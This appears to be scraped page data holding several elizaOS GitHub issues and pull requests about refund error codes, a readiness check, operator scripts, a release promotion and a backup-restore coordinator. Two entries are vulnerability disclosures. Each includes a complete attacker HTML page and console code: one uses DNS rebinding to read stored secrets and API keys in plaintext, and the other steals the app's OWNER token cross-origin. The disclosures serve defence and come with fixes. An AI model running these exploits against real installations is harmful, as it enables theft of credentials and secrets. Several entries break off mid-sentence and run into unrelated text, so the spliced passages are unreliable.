positive USD amount with at most six decimals\".\n\nThe code union (`:37-44`) has no member for a key problem. The messages are right; the typed reason is wrong, which is the same shape as #32945 (a whole-cents amount reported as `AMOUNT_TOO_LARGE`). The repository error policy asks for an actionable `code`; an operator who branches on `CRYPTO_REFUND_INVALID_AMOUNT` and corrects the amount is chasing the wrong field for both key cases.\n\nConsumers: `git grep CRYPTO_REFUND_INVALID_AMOUNT` across `packages/` and `plugins/` finds only the service and its test. The operator script (`packages/cloud/scripts/admin/refund-crypto-payment.ts`) prints the thrown error, so it shows the code verbatim.\n\n**To Reproduce**\n\nOn `origin/develop` `27dec7b0c3`, Bun 1.3.14, against a PGlite database migrated with `bun run db:cloud:migrate` and holding no rows. A probe calls the real service with three keys (the third is well-formed, so it reaches the payment lookup):\n\n```\n$ DATABASE_URL=pglite://\u003cdir\u003e bun --conditions=eliza-source \u003cprobe\u003e.ts\n{\"refundKey\":\"k\",\"code\":\"CRYPTO_REFUND_INVALID_AMOUNT\",\"message\":\"Refund key is invalid\"}\n{\"refundKey\":\"bad key with spaces\",\"code\":\"CRYPTO_REFUND_INVALID_AMOUNT\",\"message\":\"Refund key is invalid\"}\n{\"refundKey\":\"support-ticket-0001\",\"code\":\"CRYPTO_REFUND_PAYMENT_NOT_FOUND\",\"message\":\"Crypto payment not found\"}\n```\n\nThe reuse case needs a settled payment; the service test's PGlite fixture reproduces it (refund once with key `support-ticket-3` for 2 USD, then again with the same key for 3 USD) and gets `CRYPTO_REFUND_INVALID_AMOUNT` from `:193-197`.\n\n**Expected behavior**\n\n- A malformed refund key gets its own code, for example `CRYPTO_REFUND_INVALID_KEY`, with the current message.\n- A refund key reused with a different amount gets its own code, for example `CRYPTO_REFUND_KEY_AMOUNT_MISMATCH`, with the current message and the `paymentId` context.\n- `CRYPTO_REFUND_INVALID_AMOUNT` stays for the amount check only. No message, ordering or ledger behaviour changes.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - a service error code with no rendered surface; the probe transcript above is the proof.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no visible surface; see the transcript.\n- [x] Backend logs and frontend console/network logs when relevant: the service's thrown code and message are in the transcript. N/A for frontend.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model, prompt or action is involved.\n- [x] Domain artifacts when relevant: the code and message pairs above, from the real service on a migrated PGlite database.\n\n**Additional context**\n\n- The operator script that surfaces these codes cannot currently start on `develop` (#33054); the probe called the service directly through the `@elizaos/cloud-shared` export.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-fable-5-1`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-fable-5-1\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-fable-5-1\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"51:T191e,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\n`/api/status`, `/api/health` and the WebSocket status payload report `canRespond: true` on two runtimes whose first turn cannot be served, because `computeCanRespond` counts the local-inference router as a text provider.\n\n- `computeCanRespond` (`packages/agent/src/api/health-routes.ts:468`) asks `hasTextGenerationHandler(runtime)`, which is satisfied by any registration on a text slot. The local-inference plugin registers `eliza-router` on every text slot (`plugins/plugin-local-inference/src/services/router-handler.ts`, `installRouterHandler`). The router serves nothing itself: it dispatches to the other registered handlers, and with none it throws `NoModelProviderConfiguredError` (`router-handler.ts:488-490`, \"No provider registered for TEXT_LARGE. Configure a cloud provider, enable local inference, or pair a device.\"). A runtime whose text slots hold only the router therefore reports `canRespond: true` while every turn fails. That shape is produced in practice: with `ELIZA_DEVICE_BRIDGE_ENABLED=1` and no device attached, `ensureLocalInferenceHandler` installs the router and returns before registering any text handler (`plugins/plugin-local-inference/src/runtime/ensure-local-inference-handler.ts:1784-1797`).\n- `isCloudTextModelUnavailable` (`health-routes.ts:640-644`) gates chat only when every provider registered for ``\n\nWithout the router, the same Cloud-only runtime is gated correctly, which the existing `local-model-readiness-http.test.ts` pins (\"preserves Cloud unknown, explicit unavailable, and fallback-provider behavior\").\n\n**Expected behavior**\n\n- A runtime whose text slots hold nothing but the router reports `canRespond: false`, the same as a runtime with no text handler at all.\n- A runtime with Cloud behind the router is gated by a positive catalog answer that the Cloud model is missing, the same as a Cloud-only runtime without the router.\n- A router over any real provider (local inference, Cloud, OpenAI, Ollama, a custom provider) keeps reporting `canRespond: true`.\n\n**Screenshots / recording of the wrong behavior (required for anything visible)**\n\nN/A - the defect is in the readiness JSON that the composer gate reads; the test transcript above is the proof. The visible effect is a composer that goes live on a host whose first turn then fails.\n\n**Evidence / reproduction proof**\n\n- [x] MP4 recording or JPG screenshots of the broken behavior: N/A - no rendered surface of its own; see the transcript.\n- [x] Backend logs and frontend console/network logs when relevant: the assertion output above; `useModel` rejects with `NoModelProviderConfiguredError` on the router-only runtime.\n- [x] Real-LLM trajectory when the bug involves agent/action/prompt/model behavior: N/A - no model is invoked; the router rejects before any provider.\n- [x] Domain artifacts when relevant: the registration table of the router-only runtime (`getModelRegistrations()` filtered to `TEXT_LARGE` gives `[\"eliza-router\"]`).\n\n**Additional context**\n\n- `hasTextGenerationHandler` lives in `plugins/plugin-assistant/src/services/message/trajectory-stages.ts:385-397` and uses `runtime.getModel(type)`, which returns the router's handler. The narrowest fix keeps that helper and adds a router-aware registration check in `health-routes.ts`, which already knows the router's provider name.\n- On a device-bridge host, the UI composer currently goes live while the device is still absent. After the fix it stays locked until a device or another provider registers, which matches what a turn would do.\n\n**Contribution provenance**\n\n\u003c!-- contribution-attribution:v1 --\u003e\n\u003c!-- attribution-row:ai-assistance --\u003e\n- AI assistance: `yes`\n\u003c!-- attribution-row:models --\u003e\n- Model(s) used: `anthropic/claude-fable-5-1`\n\u003c!-- attribution-row:client --\u003e\n- Agent tooling: `Claude Code`\n\u003c!-- attribution-row:skill-revision --\u003e\n- Skill path: `elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza`\n\u003c!-- attribution-row:status --\u003e\n- Provenance status: `self-reported`\n\nAI provider/model: anthropic / claude-fable-5-1\nClient / agent tooling: Claude Code\nContribution skill revision: elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\nAttribution status: self-reported\n— [nxn-claude-code]\n\u003c!-- eliza-computer-attribution:v1 {\"provider\":\"anthropic\",\"model\":\"claude-fable-5-1\",\"client\":\"Claude Code\",\"skill_revision\":\"elizaOS/army@46fa4776ba6bd0df2e7236c95a3c77e69cd1db99:skills/contribute-to-eliza\"} --\u003e\n"])</script><script>self.__next_f.push([1,"52:T187c,"])</script><script>self.__next_f.push([1,"**Describe the bug**\n\nThree Cloud operator scripts cannot start. Their documented commands stop at module loading, before the script reaches the service it exists to call.\n\n- `packages/cloud/scripts/admin/refund-crypto-payment.ts:43-45` imports `@/lib/services/crypto-payment-refunds`.\n- `packages/cloud/scripts/admin/promote-admin.ts:47` imports `@/lib/services/admin`.\n- `packages/cloud/scripts/admin/set-billing-email.ts:15-16` imports `@/db/client` and `@/db/schemas/organizations`.\n\nThe `@/` alias is a `paths` entry in `packages/cloud/shared/tsconfig.json`. Nothing maps it for `packages/cloud/scripts`: the tooling package (`packages/ P client error carrying its request/socket/agent).\n- Regression tests on the real walker.\n\nFix: #33045\n"])</script><script>self.__next_f.push([1,"55:T2a59,"])</script><script>self.__next_f.push([1,"## Summary\n\nTwo locally-trusting servers started by the desktop app combine into a **DNS rebinding** bypass of the same-origin policy:\n\n1. The **renderer server** (Electrobun main process, `Bun.serve`, `127.0.0.1:5174`) reverse-proxies `/api/*`, `/ws`, `/music-player` to the agent API it spawned on `127.0.0.1:31337`. Before forwarding, it **strips the request's `Host` header** (treated as hop-by-hop) and rewrites it to the loopback target, while passing `Origin` / `Sec-Fetch-*` through. The proxy itself does not validate where a request comes from.\n2. The **agent API** treats every loopback peer as **OWNER, unconditionally** (`isTrustedLocalRequest`).\n\nAn attacker serves a page from a rebinding domain — e.g. `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us`, which alternates A records between the attacker's IP and `127.0.0.1` (TTL 1s). Once the domain resolves to `127.0.0.1`, the attacker's page is **same-origin with the renderer server**, and its GETs flow through the proxy into the agent API: `Host` has been rewritten to loopback, a same-origin GET carries **no `Origin` header**, and `Sec-Fetch-Site` is `same-origin` — every loopback-trust condition is satisfied *legitimately*, so the request is authorized as **OWNER with zero credentials**.\n\nResult: any website can read **all GET endpoints** of the agent API, including:\n\n- `GET /api/secrets/inventory` — enumerates every stored secret (key / label / category / lastModified)\n- `GET /api/secrets/inventory/:key` — returns the secret's **current value in plaintext** (verified: `{\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"}`) — e.g. LLM provider API keys\n- `GET /api/secrets` — directory with isSet status + masked values (`maskValue`) for cross-checking\n- `/api/agents`, `/api/plugins`, `/api/rooms`, … — s/inventory/\u003ckey\u003e\")\n  → renderer proxy strips Host, forwards → agent API (127.0.0.1:31337)\n  → loopback peer + rewritten Host + GET without Origin → trusted → OWNER\n  → 200 {\"ok\":true,\"value\":\"sk-…\"} — plaintext API key, readable same-origin\n```\n\n## Steps to reproduce\n\n\u003e DNS rebinding requires the attacker page to be served on the **same port** the victim's renderer listens on (default 5174, from any non-loopback IP — a second machine, or another NIC/LAN IP on the same machine).\n\n1. **Attacker side:** save the PoC below as `poc.html` and serve it on port 5174 (`python -m http.server 5174`).\n2. Build the rebinding domain: `7f000001.\u003cattacker-ip-hex\u003e.rbndr.us` — e.g. attacker `192.168.1.10` → hex `c0a8010a` → `7f000001.c0a8010a.rbndr.us` (`7f000001` = 127.0.0.1).\n3. **Victim side:** start the desktop app (default config), browse to `http://7f000001.c0a8010a.rbndr.us:5174/poc.html`, click \"Start\".\n4. The page polls a relative GET every 900 ms (≤90 tries). While DNS points at the attacker it just gets the PoC page back (or 404); once it flips to `127.0.0.1` you get `REBIND HIT`, and the page reads `/api/secrets/inventory`, `/api/secrets/inventory/\u003ckey\u003e` (plaintext), `/api/agents`, `/api/plugins`, `/api/rooms` — all HTTP 200, bodies fully readable (same-origin).\n\nMinimal PoC (any page on the rebinding domain, after the DNS flip):\n\n```js\nconst keys = await (await fetch(\"/api/secrets/inventory\", { cache: \"no-store\" })).json(); // enumerate stored secrets\nconst r = await fetch(\"/api/secrets/inventory/ANTHROPIC_API_KEY\", { cache: \"no-store\" }); // same-origin GET, no Origin header\nconst data = await r.json(); // {\"ok\":true,\"value\":\"sk-…\",\"source\":\"bare\"} — plaintext API key\n```\n\nSelf-contained PoC page:\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker rebind page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — DNS rebinding unauthorized-read PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eTarget endpoint:\n\u003cselect id=\"target\"\u003e\n  \u003coption value=\"/api/secrets/inventory/ANTHROPIC_API_KEY\"\u003e/api/secrets/inventory/:key (plaintext API key)\u003c/option\u003e\n  \u003coption value=\"/api/secrets/inventory\"\u003e/api/secrets/inventory (enumerate secrets)\u003c/option\u003e\n  \u003coption value=\"/api/secrets\"\u003e/api/secrets (directory: isSet + masked values)\u003c/option\u003e\n  \u003coption value=\"/api/agents\"\u003e/api/agents\u003c/option\u003e\n  \u003coption value=\"/api/plugins\"\u003e/api/plugins\u003c/option\u003e\n  \u003coption value=\"/api/rooms\"\u003e/api/rooms\u003c/option\u003e\n\u003c/select\u003e\n\u003cbutton onclick=\"rebind()\"\u003eStart DNS rebinding unauthorized read\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:160px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nlet scanning = false;\nasync function rebind() {\n  if (scanning) return;\n  if (location.protocol === 'file:') { log('[x] Open this page over http:// via the rbndr domain (file:// cannot rebind)', '#ff7b72'); return; }\n  if (/^(127\\.|localhost|\\[::1\\])/.test(location.hostname))\n    log('[!] Warning: you are on a loopback hostname — a same-origin read is not evidence; use the rbndr domain', '#d29922');\n  const target = document.getElementById('target').value;\n  scanning = true;\n  log('[*] Page origin: ' + location.origin + ' (the domain alternates attacker-IP \u003c-\u003e 127.0.0.1, TTL 1s)', '#8b949e');\n  let hit = false;\n  for (let i = 1; i \u003c= 90 \u0026\u0026 !hit; i++) {\n    try {\n      const r = await fetch(target, { cache: 'no-store', referrerPolicy: 'no-referrer' });\n      const body = await r.text();\n      if (r.status === 200 \u0026\u0026 body.length \u003e 0 \u0026\u0026 !/attacker rebind page/.test(body)) {\n        // response is no longer this PoC itself (the attacker side serves this page) -\u003e rebound to 127.0.0.1\n        hit = true;\n        log('[*] REBIND HIT @ try ' + i + ': ' + target + ' -\u003e HTTP ' + r.status + ' (now same-origin with 127.0.0.1:' + location.port + ')', '#ff7b72');\n        log('[+] First 500 bytes of the response:', '#3fb950');\n        log('    ' + body.slice(0, 500), '#8b949e');\n        if (target.indexOf('/api/secrets/inventory/') === 0 \u0026\u0026 /\"value\"\\s*:/.test(body))\n          log('[*] Plaintext API key read without authorization — ' + body, '#ff7b72');\n        log('[*] Impact: a page on the attacker domain reads agent API GET data as OWNER, with no credentials', '#ff7b72');\n      } else {\n        log('[-] try ' + i + ': HTTP ' + r.status + ' (DNS currently on the attacker side / got the PoC page itself)', '#8b949e');\n      }\n    } catch (e) {\n      log('[-] try ' + i + ': network error (DNS currently on the attacker side, or connection refused)', '#8b949e');\n    }\n    await new Promise(s =\u003e setTimeout(s, 900));\n  }\n  if (!hit) log('[x] No hit in 90 tries. Check: do the attacker server and the victim renderer use the same port (both 5174)? Is the rbndr domain correct?', '#ff7b72');\n  scanning = false;\n}\n\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Negative control (what already works)\n\n- From an ordinary website: `fetch(\"http://127.0.0.1:5174/api/...\")` → the browser attaches `Sec-Fetch-Site: cross-site` → the agent API returns **403**.\n- Direct request to `:31337` with a stolen Bearer token → **403**.\n- Only the rebinding path succeeds without credentials — the agent API does defend against direct cross-site access; the gap is the **renderer proxy chain**.\n\n## Impact (and honest scope)\n\n- Through this path a browser obtains **read-only OWNER access**: all GET endpoints, including stored secrets in plaintext.\n- **Writes are blocked**: POST/PUT/DELETE from the browser carry `Origin` → 403. No write/RCE from the browser via this issue alone.\n- Plaintext reads only cover secrets the victim has actually stored.\n- Requires an attacker-controlled domain (free `rbndr.us` suffices) and the same port as the renderer (default 5174; if the renderer increments, the attacker port follows).\n- The rebind usually lands within ~10 s of polling (90 × 900 ms window).\n- Chrome LNA, if enforced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n\n## Suggested fix\n\n1. **Validate `Host` in the renderer proxy** (`renderer-api-proxy.ts`): only forward requests whose `Host` is the expected loopback host (`127.0.0.1:5174` / `localhost:5174`); reject everything else. This is the standard DNS-rebinding mitigation — during a rebind attack the Host is the attacker's domain.\n2. **Add a shared secret between the renderer proxy and the agent API**, so \"can connect to :5174\" no longer equals OWNER; loopback trust should not rest on forgeable/satisfiable headers alone.\n3. **Never return secret plaintext from `/api/secrets/inventory/:key`** — return masked values or decrypt on explicit request, so even a bypassed OWNER read yields no key material.\n4. Defense in depth: reject non-loopback `Host`/`Origin` outright in the loopback-trust check."])</script><script>self.__next_f.push([1,"56:T19a3,"])</script><script>self.__next_f.push([1,"## Summary\n\nThe ElizaOS desktop app starts a local **renderer HTTP server** (Electrobun main process, `Bun.serve`, default `127.0.0.1:5174`, incrementing if taken). Two flaws on this server combine:\n\n1. **Every static response is served with `Access-Control-Allow-Origin: *`** — JavaScript on any website can read the response bodies cross-origin.\n2. **The built-in index page embeds the app's boot config in plaintext**, including the agent API's **OWNER-level Bearer token (`apiToken`)** and its base URL (`apiBase`).\n\nSo if the victim simply opens any attacker-controlled web page while the desktop app is running, that page performs one plain cross-origin GET (a simple request, **no preflight**) to `http://127.0.0.1:5174/`, reads the full HTML, and extracts the OWNER token with a regex. Zero interaction, no dialogs, completely silent — the app's highest-privilege credential is handed to an arbitrary website.\n\n## Environment\n\n- `@elizaos/app` 2.0.3-beta.7 (commit `876317fb`), Windows 11, default local configuration (no special settings)\n\n## Root cause\n\n`packages/app/platforms/electrobun/src/index.ts` — static-file handling of the renderer server:\n\n```ts\n// index.ts:915-933 — HTML branch\nif (mimeExt === \".html\" || filePath.endsWith(\"index.html\")) {\n    const html = apiBaseOwner.injectIntoHtml(content.toString(\"utf8\"));  // :925 — injects apiToken + apiBase into the page\n    return new Response(html, {\n        headers: {\n            \"Content-Type\": \"text/html; charset=utf-8\",\n            \"Access-Control-Allow-Origin\": \"*\",                           // :929 — any origin may read this\n            \"Cache-Control\": \"public, max-age=0, must-revalidate\",\n        },\n    });\n}\n```\n\n```ts\n// index.ts:934-937 — all other static assets\nconst headers: Record\u003cstring, string\u003e = {\n    \"Content-Type\": getRendererAssetContentType(mimeExt),\n    \"Access-Control-Allow-Origin\": \"*\",                                   // :936\n    ...\n};\n```\n\nEither flaw alone would be harmless (no token embedded → nothing to steal; no `ACAO: *` → body unreadable cross-origin). Together, the OWNER credential leaves the victim's machine into the attacker's page context.\n\n## Steps to reproduce\n\n1. Start the desktop app (default config). The renderer listens on `127.0.0.1:5174`.\n2. Open any other web page (any http/https origin — even `file://` works, which is convenient for verification) and run this from the browser console:\n\n```js\nconst r = await fetch(\"http://127.0.0.1:5174/\", { cache: \"no-store\" });\nconst html = await r.text();\nconsole.log(r.headers.get(\"access-control-allow-origin\")); // \"*\"  (cross-origin read allowed)\nconsole.log(html.match(/apiToken:\"([0-9a-fA-F]+)\"/)[1]);   // the OWNER-level Bearer token\nconsole.log(html.match(/apiBase:\"([^\"]+)\"/)[1]);           // e.g. http://127.0.0.1:31337\n```\n\n3. The console prints the OWNER token.\n\nSelf-contained attacker page (save as `.html`, open in a browser on the victim machine, click the button):\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003ctitle\u003eattacker page\u003c/title\u003e\u003c/head\u003e\n\u003cbody style=\"background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;padding:24px\"\u003e\n\u003ch2\u003eElizaOS Desktop — cross-origin OWNER token theft PoC (this page is the \"attacker website\")\u003c/h2\u003e\n\u003cp\u003eRenderer port (default 5174): \u003cinput id=\"port\" value=\"5174\" style=\"width:80px\"\u003e\n\u003cbutton onclick=\"steal()\"\u003eSteal OWNER token (cross-origin)\u003c/button\u003e\u003c/p\u003e\n\u003cpre id=\"log\" style=\"background:#010409;border:1px solid #30363d;padding:12px;min-height:120px\"\u003e\u003c/pre\u003e\n\u003cscript\u003e\nconst log = (m, c) =\u003e {\n  const d = document.createElement('div');\n  d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;\n  d.style.color = c || '#c9d1d9';\n  document.getElementById('log').appendChild(d);\n};\nasync function steal() {\n  const port = document.getElementById('port').value.trim() || '5174';\n  log('[*] Target: http://127.0.0.1:' + port + '/  (plain GET, no preflight, any origin orced, would block page→127.0.0.1 requests; default Chrome/Firefox today are affected.\n- Not applicable in external/cloud connection mode (no `apiToken` embedded there).\n\n## Suggested fix\n\n1. **Remove `Access-Control-Allow-Origin: *`** from static responses (`index.ts:929`, `index.ts:936`). The desktop UI does not need to be readable by arbitrary web origins.\n2. **Don't embed the long-lived OWNER token in the HTML** (`injectIntoHtml`): deliver it via one-time runtime IPC, or use short-lived per-session credentials bound to the app's own processes.\n3. If the UI must be served over HTTP, put an **Origin allowlist** on the renderer server (app protocol / loopback same-origin only)."])</script><script>self.__next_f.push([1,"57:Td15,"])</script><script>self.__next_f.push([1,"Promote `develop` to `staging`. The current candidate is `0805aecdc2356b2d06d475917dbc08e7bfcadd00`. Develop Full has passed; promotion PR validation and agent-image reconciliation are still running. Keep this PR unmerged until the remaining exact-head checks finish and it receives a fresh independent approval.\n\nThe develop CI repairs address the missing billing translation, Calendar planner fixture shape, paid-plan billing snapshot expectations, cloud cache/mock setup, and a duplicate Capacitor mock export. The final duplicate-key correction landed in `0805aecdc235`; #32869 was closed because that same fix had landed independently. These corrections restore the intended checks without removing tests or weakening failure gates.\n\nCurrent-head validation:\n\n- Local install and `bun run verify`: success on this exact commit, 287/287 Turbo tasks and repository audits; tracked working tree clean.\n\n- Develop Full: https://github.com/elizaOS/eliza/actions/runs/36355095266 — success, including All Tests Passed, Complete manifest, and the reconciliation handoff. The downloaded expected/observed/results manifests were inspected and passed the repository's `verifyCompleteManifest` verifier locally raining manifest. No constraint override or disabled check has been introduced; this remains unresolved separately from the passing Develop Full run.\n"])</script><script>self.__next_f.push([1,"58:T318b,"])</script><script>self.__next_f.push([1,"Re-lands manifest-v3 restore and finishes the restore coordinator, so a user restore of a catalogued manifest-v3 backup now runs end to end in production code: quarantined create → materialize → commit → boot → attest → probe → route CAS → finalize.\n\nRefs #20726\n\n## #20732: restore coordinator\n\nFixes #20732. Everything is in code and tested against real PGlite. The only thing left is the staging drill listed below.\n\n### Re-land (commit 1)\n- Cherry-picks `9ab8150880c`, which ports closed #30820 and standujar's `feat/20732-quarantine-runtime-bridge` onto current `develop`. standujar keeps `Co-authored-by` credit.\n- It applied cleanly on top of #32876, the #31334 local-state upgrade guard; the two touch different files.\n- `packages/agent/FOOTPRINT-REVIEW.md` now records that the owner reversed the removal of the restore-v3 candidate modules for #20732.\n\n### Phases\nThe existing phase names map onto the requested ones:\n- `restoring` means materialized.\n- `committed` means the generation is committed.\n- `restart_attested` means booted and attested.\n- `probed` means probes passed.\n- `published` means routed.\n\n| From → to | What the coordinator does |\n| --- | --- |\n| `reserved`/`vault_seeded` → `container_created` | Runs the existing exact quarantined create. An ambiguous provider outcome goes through the existing claim-fenced reconciliation. |\n| `container_created` → `restoring` | 1. Starts the quarantine host.\u003cbr\u003e2. Prepares private roots inside the container (new controller worker). Their device/inode identities are recorded.\u003cbr\u003e3. Streams the catalogue into the quarantine through the guarded materializer journal, using the worker's KMS key bundle and the storage registry. Each object uses its own persisted endpoint.\u003cbr\u003e4. Records the sealed candidate receipt and session. |\n| `restoring` → `committed` | Prepares and commits the generation inside the still-networkless container, then records the committed-generation handoff. |\n| `committed` → `restart_attested` | 1. Snapshots the previous route and observes the previous runtime.\u003cbr\u003e2. Stops the previous runtime **in place** (it is retained, so it can be restarted).\u003cbr\u003e3. Serving transition: detaches the exact container from `none`, attaches the agent network (which activates host ports reserved at create) and restarts the quarantine PID 1.\u003cbr\u003e4. Hands over a boot grant.\u003cbr\u003e5. Launches the committed generation.\u003cbr\u003e6. Polls a private-socket probe until it returns an HMAC-signed boot attestation under the per-restore activation token.\u003cbr\u003e7. Sandbox activation moves `restore_pending` → `restart_attested` and the operation advances, in one transaction. |\n| `restart_attested` → `probed` | Runs three fresh-nonce signed probes. Each checks the MAC, the identities, the committed-generation digest and the listen port. |\n| `probed` → `published` | Route CAS, in one transaction:\u003cbr\u003e- proves the canonical route still equals the snapshot;\u003cbr\u003e- adopts the provider-settled replacement (`lifecycle_committed`);\u003cbr\u003e- activates the generation (`active`, published/dispatched/completed);\u003cbr\u003e- points `sandbox_id`/`node_id`/`container_name`/`bridge_url`/`health_url`/`image_digest` at the restored container. |\n| `published` → `finalized` | 1. Appends the immutable activation publication from the active generation.\u003cbr\u003e2. Removes the previous container, bound to its identity, and releases its node slot once.\u003cbr\u003e3. Writes the final restore receipt (`commitAgentBackupRestore`, backup → `restore_verified`).\u003cbr\u003e4. Finalizes the operation with the receipt and releases the lease. |\n\n### Failure policy (fail closed at each phase)\n- **Before the previous runtime is touched:** failures retry with exponential backoff up to `AGENT_BACKUP_RESTORE_MAX_ATTEMPTS`. After that the restore activation is blocked and the operation fails terminally. The route never moves.\n- **After the previous runtime is stopped** (`committed`, `restart_attested`, `probed`): any failure rolls back. The restored container is stopped, the retained previous runtime is restarted, the activation is blocked, the operation fails terminally and the lease is released. If rollback is incomplete, the operation is recorded as `AGENT_BACKUP_RESTORE_ROLLBACK_INCOMPLETE` and the error is rethrown so an operator is alerted.\n- **Cleanup after a terminal failure:** the failed container is fenced (`cleanup_in_progress`) before it is removed exactly. It is then settled as `cleanup_proven`, and its node slot is released once. Settling frees the agent's replacement fence, so later restores and upgrades are not blocked. A cycle sweep retries any interrupted cleanup. A later restore may replace the `blocked` activation that the failed restore left behind.\n- **After the route CAS:** rollback no longer applies. Finalization retries until it settles.\n- **Lapsed lease:** an operation whose lease lapsed with no live claim is closed explicitly as `AGENT_BACKUP_RESTORE_LEASE_EXPIRED`.\n- **Evidence is write-once:** every piece of phase evidence lives in `agent_backup_restore_operations.serving_state` (migration `0495`, journal updated). A lost response therefore replays and never re-executes.\n\n### Production caller\n- `POST /api/v1/eliza/agents/:agentId/restore` → `elizaSandboxService.restore()` → `admitCoordinatedAgentBackupRestore`.\n- When `AGENT_BACKUP_RESTORE_COORDINATOR_ENABLED=1` and the selected backup is a catalogued manifest-v3 backup in a restorable state, the route acquires the restore lease for `AGENT_BACKUP_RESTORE_WORKER_ID`, opens the operation and returns **202** with the operation id.\n- A second request reports the in-progress restore. Another coordinator's restore returns 409.\n- Legacy snapshot rows keep the existing push/re-provision path.\n- The coordinator runs as a `restore-coordinator` stage of the existing backup-catalogue worker daemon. That stage shares the worker's KMS key bundle and storage registry.\n\n### Deliberate change to the quarantine create\n- Docker cannot add port bindings to an existing container. The exact quarantine is therefore created with its two host ports reserved (`-p`), still attached only to `none`, where the bindings are inert.\n- The create readback and every command fingerprint now require the reserved bindings.\n- The only transition that attaches a network is the coordinator's serving transition, after the committed generation is proven.\n\n### Agent side\n- `agent-backup-restore-v3-controller-worker`: one-shot, private, with three methods: `prepareRoots`, `commitGeneration` and `writeBootGrant`.\n- `agent-backup-restore-v3-restored-runtime`: boots `startEliza({ restoredGeneration })` behind an exclusive lock and serves signed attestations on a 0600 unix socket.\n- `agent-backup-restore-v3-probe-client`: relays one probe.\n- Contract: `@elizaos/core/contracts/agent-backup-restore-v3-serving`.\n- Agent restore tests had wall-clock test budgets that timed out under load. Those budgets are now load-tolerant. Assertions and deliberately short expiry deadlines are unchanged.\n\n### Remaining: staging drill (needs an authorized staging run)\n1. On a real Hetzner node, confirm Docker accepts `-p` with `--network none` at create. Then confirm that `docker network disconnect none` followed by `docker network connect \u003cagent-net\u003e` on the stopped exact container activates the reserved bindings.\n2. Confirm the built image ships the three new `dist/services/*.js` entrypoints and the new core contract in `packages/core/dist`. Confirm the runtime launched with `docker exec -d` (using the image's `/opt/tsx` loader) inherits the agent env and binds `ELIZA_PORT`.\n3. Restore a real agent and verify functional LLM recall of pre-backup memory through the published `bridge_url`.\n4. Exercise a forced probe failure and confirm the previous runtime restarts.\n\n## #24407: fair admission and legacy cron\n\nRefs #24407. Verified; the cron is **not** retired.\n- The minute admission (`/api/v1/cron/agent-backup-admission`) is fair: 64 sharded durable cursors, bounded per-invocation claim and enrollment budgets, and explicit deferral.\n- It only enrolls agents whose activation is `active` with published activation authority. Before this PR nothing in production wrote that state. After it, only coordinator restores do.\n- Retiring the six-hour `enqueueScheduledBackups` caller would therefore leave every legacy agent with no scheduled backup.\n- The cron comment now records this. Retirement needs an activation backfill for legacy agents first; the admission route stays gated off (`AGENT_BACKUP_ADMISSION_CALLER_ENABLED=0`).\n\n## #23235: capture escalation and stranded-row plan\n\nRefs #23235.\n- A capture operation that keeps failing retryably is escalated once it reaches `AGENT_BACKUP_CAPTURE_ESCALATION_ATTEMPTS` claims (default 8). The typical case is the available-memory gate.\n- The escalated failure becomes a trusted **terminal** disposition, `AGENT_BACKUP_V2_CAPTURE_ESCALATED`. It carries the exact spool-cleanup authority, so it settles through the vetted terminal path.\n- The worker raises `BACKUP_CAPTURE_V2_ESCALATED` and logs the org and backup.\n- Stale-runtime-authority failures are never escalated.\n\n### Plan for repairing stranded rows (not executed; live customer rows)\n1. **Inventory (read-only).** Collect every `agent_sandboxes` row in `deletion_pending`/`deletion_failed` older than 24h. For each, record its last error, `deletion_attempt_id`, `bridge_url`, node and whether a container is present (observe only).\n2. **Classify.**\n   - (a) node-unreachable, where the node is now reachable;\n   - (b) permanently failed on a since-fixed defect (#23117 `toISOString`, job timeout);\n   - (c) capture refused, where the customer wants the state gone;\n   - (d) the container is already absent.\n3. **Repair per class, through existing lifecycle authority only (no raw SQL).**\n   - 